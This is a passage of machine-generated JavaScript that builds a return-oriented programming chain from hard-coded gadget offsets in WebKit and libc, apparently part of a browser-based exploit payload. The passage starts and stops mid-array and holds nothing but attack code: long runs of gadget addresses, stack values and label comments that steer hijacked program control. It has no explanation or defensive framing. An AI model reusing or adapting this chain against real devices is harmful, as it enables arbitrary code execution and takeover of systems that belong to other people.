webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103000, //L971
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+103088, //L972
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L972:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103144, //L974
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L974:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103216, //L976
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L976:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103272, //L978
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L978:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103360, //L980
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L980:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L982:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+103480, //L985
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103464, //L983
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L983:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L985:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+103624, //L988
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+103592, //L986
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103608, //L987
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L986:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L987:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L988:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+103696, //L989
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L989:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+103752, //L991
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L991:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+103832, //L995
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L995:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L993:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L994:
db([4, 0]); // 0x4
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+103936, //L996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+103952, //L997
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L996:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L997:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+104040, //L998
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L998:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104096, //L1000
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1000:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104200, //L1002
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1002:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1004:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+104320, //L1007
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104304, //L1005
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1005:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1007:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104464, //L1010
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+104432, //L1008
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104448, //L1009
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1008:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1009:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1010:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+104536, //L1011
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+104592, //L1013
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1013:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+104672, //L1017
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1017:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1015:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1016:
db([18, 0]); // 0x12
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+104776, //L1018
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+104792, //L1019
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1018:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1019:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+104880, //L1020
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1020:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+104936, //L1022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1022:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105008, //L1024
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1024:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105064, //L1026
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1026:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1028:
webkit_base+7438103, //mov [rsi], rax
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105200, //L1029
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1029:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1031:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+105320, //L1034
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105304, //L1032
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1032:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1034:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105464, //L1037
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+105432, //L1035
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105448, //L1036
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1035:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1036:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1037:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+105536, //L1038
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1038:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+105592, //L1040
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1040:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+105672, //L1044
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1044:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1042:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1043:
db([19, 0]); // 0x13
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+105776, //L1045
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+105792, //L1046
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1045:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1046:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+105880, //L1047
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1047:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+105936, //L1049
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1049:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106008, //L1051
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1051:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106064, //L1053
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1053:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1055:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106200, //L1056
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1056:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1058:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+106320, //L1061
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106304, //L1059
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1059:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1061:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106464, //L1064
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+106432, //L1062
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106448, //L1063
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1062:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1063:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1064:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+106536, //L1065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+106592, //L1067
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1067:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+106672, //L1071
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1071:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1069:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1070:
db([20, 0]); // 0x14
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+106776, //L1072
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+106792, //L1073
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1072:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1073:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+106880, //L1074
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1074:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+106936, //L1076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1076:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107008, //L1078
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1078:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107064, //L1080
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1080:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
//L1082:
libc_base+793877, //pop rsi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107200, //L1083
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1083:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1085:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+107320, //L1088
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107304, //L1086
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1086:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1088:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107464, //L1091
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+107432, //L1089
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107448, //L1090
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1089:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1090:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1091:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+107536, //L1092
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1092:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+107592, //L1094
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1094:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+107672, //L1098
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1098:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1096:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1097:
db([21, 0]); // 0x15
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+107776, //L1099
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+107792, //L1100
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1099:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1100:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+107880, //L1101
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1101:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+107936, //L1103
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1103:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108008, //L1105
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1105:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108064, //L1107
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1107:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+2997875, //mov [rax], rcx
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108152, //L1109
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1109:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1111:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+108272, //L1114
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108256, //L1112
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1112:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1114:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108416, //L1117
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+108384, //L1115
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108400, //L1116
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1115:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+108488, //L1118
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1118:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+108544, //L1120
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1120:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+108624, //L1124
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1124:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1122:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L1123:
db([3, 0]); // 0x3
set_gadgets([
webkit_base+1506828, //imul rax, rcx
libc_base+793877, //pop rsi
ropchain+108728, //L1125
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+108744, //L1126
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L1125:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1126:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+108832, //L1127
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1127:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+108888, //L1129
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L1129:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+108992, //L1131
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L1131:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1133:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+109112, //L1136
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
